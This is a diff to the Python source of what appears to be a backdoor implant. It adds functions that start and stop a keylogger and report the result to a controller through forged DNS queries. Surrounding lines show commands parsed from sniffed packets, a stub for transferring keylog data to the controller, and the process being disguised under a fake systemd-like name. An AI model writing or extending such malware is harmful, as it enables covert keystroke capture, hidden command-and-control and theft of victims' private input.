@@ -270,6 +270,27 @@ def execute_watch_command(path: str) -> bool:
     send_dns_query(query)
     return True
 
+def stop_keylogger():
+    if KEYLOGGER_INSTANCE.stop():
+        print("SUCCESS: Stopped keylogger")
+        query = forge_dns_query_stream("SUCCESS: Stopped keylogger", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+    else:
+        print("FAILED: You can't stop an inactive keylogger")
+        query = forge_dns_query_stream("FAILED: You can't stop an inactive keylogger", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+
+
+def start_keylogger():
+    if KEYLOGGER_INSTANCE.start():
+        print("SUCCESS: Started keylogger")
+        query = forge_dns_query_stream("SUCCESS: Started keylogger", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+    else:
+        print("FAILED: You can't start an active keylogger")
+        query = forge_dns_query_stream("FAILED: You can't start an active keylogger", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+
 
 def packet_handler(pkt):
     """
@@ -286,15 +307,9 @@ def packet_handler(pkt):
             execute_watch_command(argv[1])
         if argv[0] == KEYLOGGER:
             if argv[1] == STOP:
-                if KEYLOGGER_INSTANCE.stop():
-                    print("SUCCESS: Stopped keylogger")
-                else:
-                    print("FAILED: You can't stop an inactive keylogger")
+                stop_keylogger()
             if argv[1] == START:
-                if KEYLOGGER_INSTANCE.start():
-                    print("SUCCESS: Started keylogger")
-                else:
-                    print("FAILED: You can't start an active keylogger")
+                start_keylogger()
             if argv[1] == TRANSFER:
                 # 1. Get the keylog data.
                 # 2. Transfer it to the controller.
@@ -302,6 +317,7 @@ def packet_handler(pkt):
 
 
 MONITOR = FileSystemMonitor()
+
 
 if __name__ == "__main__":
     hide_process_name("systemd-userwork-evil")
